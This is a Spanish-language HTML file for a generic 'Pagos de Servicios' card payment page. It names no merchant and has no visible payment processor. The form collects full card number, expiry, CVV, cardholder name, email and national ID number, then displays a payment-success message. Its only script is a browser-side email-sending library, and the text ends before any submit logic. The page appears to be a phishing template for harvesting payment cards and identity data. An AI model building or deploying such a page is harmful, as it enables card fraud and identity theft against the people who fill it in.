<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Pagos de Servicios</title>

<style>
  body {
    margin: 0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)),
      url('https://images.unsplash.com/photo-1590159914188-1d46aa79f9e3?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat fixed;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    color: #ecf0f1;
  }

  .container {
    background: #fff;
    color: #2c3e50;
    padding: 35px 25px;
    border-radius: 14px;
    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
    max-width: 450px;
    width: 100%;
  }

  h1 {
    text-align: center;
    margin-bottom: 5px;
  }

  .subtitle {
    font-size: 14px;
    text-align: center;
    margin-bottom: 25px;
    color: #34495e;
  }

  .form-group {
    position: relative;
    margin-bottom: 18px;
  }

  input[type="text"],
  input[type="email"],
  input[type="number"],
  input[type="tel"] {
    width: 100%;
    padding: 12px 15px;
    font-size: 16px;
    border-radius: 7px;
    border: 1.8px solid #bdc3c7;
    outline: none;
    transition: border-color 0.3s;
  }

  input[type="text"]:focus,
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="tel"]:focus {
    border-color: #2980b9;
  }

  .error {
    color: #e74c3c;
    font-size: 13px;
    margin-top: -12px;
    margin-bottom: 12px;
    display: block;
  }

  input.invalid {
    border-color: #e74c3c;
    background-color: #fff0f0;
  }

  .peso-simbolo {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    color: #7f8c8d;
    font-size: 16px;
    pointer-events: none;
  }

  #seleccion-monto input {
    padding-left: 28px;
  }

  label {
    font-weight: 600;
    display: block;
    margin-bottom: 6px;
  }

  .radio-group {
    display: flex;
    gap: 20px;
    margin-bottom: 22px;
  }

  .radio-group label {
    font-weight: normal;
    cursor: pointer;
  }

  button {
    width: 100%;
    padding: 13px;
    background-color: #2980b9;
    border: none;
    color: white;
    font-size: 17px;
    border-radius: 9px;
    cursor: pointer;
    transition: background-color 0.3s ease;
  }

  button:hover {
    background-color: #1c5980;
  }

  #loader {
    display: none;
    margin: 15px auto 20px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #2980b9;
    border-radius: 50%;
    width: 38px;
    height: 38px;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg);}
    100% { transform: rotate(360deg);}
  }

  #mensaje-exito {
    display: none;
    text-align: center;
    font-size: 16px;
    color: #27ae60;
    margin-top: 15px;
    font-weight: 600;
  }
</style>
</head>
<body>
<div class="container">

  <h1>Pagos de Servicios</h1>
  <p class="subtitle">Por favor, ingresa el monto y completa tus datos para realizar el pago con tarjeta.</p>

  <!-- Selección de monto -->
  <div id="seleccion-monto">
    <div class="form-group" style="position: relative;">
      <input type="number" id="monto-personalizado" placeholder="Monto a pagar" min="1" step="0.01" required />
      <span class="peso-simbolo">$</span>
      <span class="error" id="error-monto"></span>
    </div>
    <button id="continuar-btn">Continuar</button>
  </div>

  <!-- Formulario oculto hasta ingresar monto -->
  <form id="form-pago" style="display:none;">
    <input type="hidden" name="monto" id="monto-hidden" />

    <label>Seleccione tipo de tarjeta:</label>
    <div class="radio-group">
      <label><input type="radio" name="tipo-tarjeta" value="Visa" required /> Visa</label>
      <label><input type="radio" name="tipo-tarjeta" value="Mastercard" /> Mastercard</label>
    </div>

    <div class="form-group">
      <input type="text" name="tarjeta" id="tarjeta" placeholder="Número de tarjeta" maxlength="16" required />
      <span class="error" id="error-tarjeta"></span>
    </div>

    <div class="form-group">
      <input type="text" name="titular" id="titular" placeholder="Nombre del titular" required />
      <span class="error" id="error-titular"></span>
    </div>

    <div class="form-group">
      <input type="text" name="vencimiento" id="vencimiento" placeholder="Vencimiento MM/AA" maxlength="5" required />
      <span class="error" id="error-vencimiento"></span>
    </div>

    <div class="form-group">
      <input type="text" name="cvv" id="cvv" placeholder="Código de seguridad (CVV)" maxlength="4" required />
      <span class="error" id="error-cvv"></span>
    </div>

    <div class="form-group">
      <input type="text" name="nombre" id="nombre" placeholder="Tu nombre" required />
      <span class="error" id="error-nombre"></span>
    </div>

    <div class="form-group">
      <input type="email" name="email" id="email" placeholder="Tu email" required />
      <span class="error" id="error-email"></span>
    </div>

    <div class="form-group">
      <input type="text" name="dni" id="dni" placeholder="DNI" required />
      <span class="error" id="error-dni"></span>
    </div>

    <button type="submit">Realizar pago</button>
  </form>

  <div id="loader"></div>
  <div id="mensaje-exito">¡Pago realizado con éxito! Revisa tu correo.</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
